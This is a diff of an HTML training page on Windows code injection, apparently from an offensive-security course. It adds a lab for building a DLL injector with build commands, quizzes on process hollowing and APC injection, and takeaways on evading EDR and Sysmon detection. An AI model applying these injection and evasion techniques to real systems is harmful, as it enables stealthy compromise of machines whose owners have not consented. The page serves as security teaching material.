+            <p style="margin-top: 1rem;"><strong>Cross-link:</strong> Full EDR evasion techniques in <a href="MODULE_13_EDR_EVASION.html" class="cross-link">Module 13: EDR Evasion</a> and <a href="MODULE_12_DEFENSIVE_VERIFY.html" class="cross-link">Module 12: Defensive Verification</a>.</p>
+        </div>
+
+        <h2>🧪 Lab Exercise: Build Your Own Injector</h2>
 
         <div class="step-box">
             <h4>Safe Practice Environment</h4>
-            <p><strong>DO NOT inject into system processes.</strong> Practice on notepad.exe or calc.exe that you started yourself.</p>
+            <p><strong>DO NOT inject into system processes.</strong> Practice on notepad.exe or calc.exe that you started yourself. Use WUPC .42 (192.168.1.42) for live testing.</p>
 
             <ol style="margin-left: 1.5rem; line-height: 2;">
                 <li>Start notepad.exe</li>
-                <li>Compile inject.dll (MessageBox version, safe)</li>
+                <li>Compile inject.dll (MessageBox version — safe)</li>
                 <li>Compile injector.exe</li>
                 <li>Run injector.exe</li>
                 <li>Verify: Did MessageBox appear? (Yes = success)</li>
                 <li>Check KAV: Any alert? (No = stealth confirmed)</li>
+                <li>Check Event Viewer: Any Sysmon Event ID 8?</li>
+                <li>Try process hollowing with calc.exe (advanced)</li>
             </ol>
 
-            <button onclick="document.getElementById('inject-solution').style.display='block'">Show Build Commands</button>
+            <button onclick="document.getElementById('build-commands').style.display='block'">Show Build Commands</button>
 
-            <div id="inject-solution" style="display:none; margin-top: 1rem;">
+            <div id="build-commands" style="display:none; margin-top: 1rem;">
                 <div class="code-block">
-=== BUILD COMMANDS (Developer Command Prompt) ===
+=== BUILD COMMANDS (Developer Command Prompt for VS 2022) ===
 
 # 1. Open "Developer Command Prompt for VS 2022"
-#    (NOT regular cmd. NOT PowerShell.)
+#    NOT regular cmd. NOT PowerShell. Needs MSVC compiler.
 
 # 2. Build the DLL
 cl.exe /LD inject_dll.c /Fe:C:\temp\inject.dll
@@ -425,19 +905,77 @@ cl.exe injector.c /Fe:C:\temp\injector.exe
 C:\temp> notepad.exe &
 C:\temp> injector.exe
 
-# Expected: MessageBox "Injected!" appears
+# Expected: MessageBox "Injected!" appears inside notepad.exe
+# If it fails: Run as Administrator (needs PROCESS_ALL_ACCESS)
+# If still fails: Check if notepad.exe is 32-bit vs 64-bit
+#   Must match your compiler architecture (x86 vs x64)
                 </div>
             </div>
         </div>
 
-        <h2>Key Takeaways</h2>
+        <h2>🎯 Interactive Quiz — Test Your Knowledge</h2>
+
+        <div class="quiz-container" id="quiz-1">
+            <h4>Question 1: Why does DLL injection use LoadLibraryA?</h4>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-1')">
+                A) LoadLibraryA is the only way to load DLLs in Windows
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz-1')">
+                B) LoadLibraryA exists in every process's address space (kernel32.dll), so we don't need to inject our own loader code
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-1')">
+                C) LoadLibraryA bypasses Windows security checks
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-1')">
+                D) LoadLibraryA is faster than manual PE loading
+            </div>
+            <div class="quiz-feedback" id="feedback-quiz-1"></div>
+        </div>
+
+        <div class="quiz-container" id="quiz-2">
+            <h4>Question 2: What makes process hollowing stealthier than DLL injection?</h4>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-2')">
+                A) It uses fewer API calls
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz-2')">
+                B) The process appears as a signed legitimate binary (svchost.exe) but runs malicious code
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-2')">
+                C) It doesn't need OpenProcess
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-2')">
+                D) It automatically bypasses all AV
+            </div>
+            <div class="quiz-feedback" id="feedback-quiz-2"></div>
+        </div>
+
+        <div class="quiz-container" id="quiz-3">
+            <h4>Question 3: Why does APC injection evade Sysmon Event ID 8?</h4>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz-3')">
+                A) It hijacks an existing thread instead of creating a new one
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-3')">
+                B) It uses encrypted payloads
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-3')">
+                C) It runs in kernel mode
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-3')">
+                D) It disables Sysmon before injection
+            </div>
+            <div class="quiz-feedback" id="feedback-quiz-3"></div>
+        </div>
+
+        <h2>📚 Key Takeaways</h2>
 
         <ul style="margin-left: 1.5rem; line-height: 2;">
-            <li><strong>Code injection is a Windows feature:</strong> Debuggers use it. AV can't block it globally.</li>
-            <li><strong>DLL injection is the simplest:</strong> Open → Allocate → Write → Execute. Four API calls.</li>
-            <li><strong>Process hollowing is the stealthiest:</strong> Signed binary appearance, malicious memory content.</li>
-            <li><strong>KAV doesn't see injection:</strong> It sees the result (new thread), not the act. Behavioral detection only.</li>
-            <li><strong>Practice safely:</strong> Only inject into processes you own. System injection = blue screen or detection.</li>
+            <li><strong>Code injection is a Windows feature:</strong> Debuggers use it. AV can't block it globally without breaking legitimate software.</li>
+            <li><strong>DLL injection is the simplest:</strong> Open → Allocate → Write → Execute. Four API calls. Learn this first.</li>
+            <li><strong>Process hollowing is the stealthiest:</strong> Signed binary appearance, malicious memory content. Requires shellcode skills from <a href="MODULE_09_MALWARE.html" class="cross-link">Module 09</a>.</li>
+            <li><strong>APC injection evades thread detection:</strong> No CreateRemoteThread = no Sysmon Event ID 8.</li>
+            <li><strong>Reflective DLL is fileless:</strong> No disk artifact. No registry. Lives only in memory. The gold standard for stealth.</li>
+            <li><strong>EDR detects sequences, not individual calls:</strong> Split your operations. Add noise. Use legitimate APIs.</li>
+            <li><strong>Privilege escalation is required:</strong> Without admin/SeDebugPrivilege, you can only inject into your own processes. See <a href="MODULE_08_PRIVESC.html" class="cross-link">Module 08</a>.</li>
         </ul>
 
         <div class="evidence-box" style="margin-top: 2rem;">
@@ -452,21 +990,92 @@ C:\temp> injector.exe
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .42</td>
                 </tr>
                 <tr style="border-bottom: 1px solid var(--border);">
-                    <td style="padding: 0.5rem;">Process hollowing (explained)</td>
+                    <td style="padding: 0.5rem;">Process hollowing (svchost.exe)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .92</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">APC injection (theory)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Thread hijacking (theory)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Atom bombing (theory)</td>
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
                 </tr>
                 <tr>
-                    <td style="padding: 0.5rem;">CreateRemoteThread execution</td>
-                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .42</td>
+                    <td style="padding: 0.5rem;">Reflective DLL (theory)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
                 </tr>
             </table>
         </div>
 
+        <div class="first-principle" style="margin-top: 2rem;">
+            <h3>🧠 The Mentor's Lesson</h3>
+            <p><em>"Privilege escalation is easy. Code injection is just the delivery. The real skill is knowing WHEN to inject, WHAT to inject, and HOW to clean up after. Save every rung — if your injection fails, you need another way in."</em></p>
+            <p style="margin-top: 1rem; color: var(--dim);">— From <a href="MODULE_08_PRIVESC.html" class="cross-link">Module 08: Privilege Escalation</a> and <a href="MODULE_11_ROOTKITS.html" class="cross-link">Module 11: Rootkits</a></p>
+        </div>
+
         <div class="nav" style="margin-top: 2rem;">
-            <a href="index.html">← Home</a>
+            <a href="../index.html">← Home</a>
             <a href="MODULE_09_MALWARE.html">← Module 09</a>
             <a href="MODULE_11_ROOTKITS.html">Module 11 →</a>
         </div>
     </div>
+
+    <script>
+        // Copy buttons for code blocks
+        document.querySelectorAll('.code-block').forEach(block => {
+            const btn = document.createElement('button');
+            btn.className = 'copy-btn';
+            btn.textContent = 'COPY';
+            btn.addEventListener('click', () => {
+                const text = block.textContent.replace('COPY', '').trim();
+                navigator.clipboard.writeText(text).then(() => {
+                    btn.textContent = 'COPIED!';
+                    setTimeout(() => btn.textContent = 'COPY', 2000);
+                });
+            });
+            block.appendChild(btn);
+        });
+
+        // Quiz functionality
+        function checkAnswer(option, quizId) {
+            const container = document.getElementById(quizId);
+            const options = container.querySelectorAll('.quiz-option');
+            const feedback = document.getElementById('feedback-' + quizId);
+            
+            // Disable all options
+            options.forEach(opt => {
+                opt.style.pointerEvents = 'none';
+                if (opt.dataset.correct === 'true') {
+                    opt.classList.add('correct');
+                } else if (opt === option) {
+                    opt.classList.add('wrong');
+                }
+            });
+            
+            // Show feedback
+            feedback.classList.add('show');
+            if (option.dataset.correct === 'true') {
+                feedback.classList.add('correct');
+                feedback.innerHTML = '<strong>✓ CORRECT</strong><br>' + getExplanation(quizId, true);
+            } else {
+                feedback.classList.add('wrong');
+                feedback.innerHTML = '<strong>✗ WRONG</strong><br>' + getExplanation(quizId, false);
+            }
+        }
+
+        function getExplanation(quizId, isCorrect) {
+            const explanations = {
+                'quiz-1': 'LoadLibraryA lives in kernel32.dll, which is loaded into EVERY Windows process. We don\'t need to inject our own loader — we just call the function that already exists. This is why DLL injection is so simple.',
+                'quiz-2': 'Process hollowing creates a legitimate Windows process (svchost.exe) in a suspended state, replaces its memory with malicious code, then resumes it. Task Manager shows a signed Microsoft binary. AV trusts it.',
+                'quiz-3': 'Sysmon Event ID 8 logs CreateRemoteThread calls. APC injection uses QueueUserAPC on an EXISTING thread — no new thread is created, so no Event ID 8 is generated.'
+            };
+            return explanations[quizId] || 'Keep studying!';
+        }
+    </script>
 </body>
 </html>
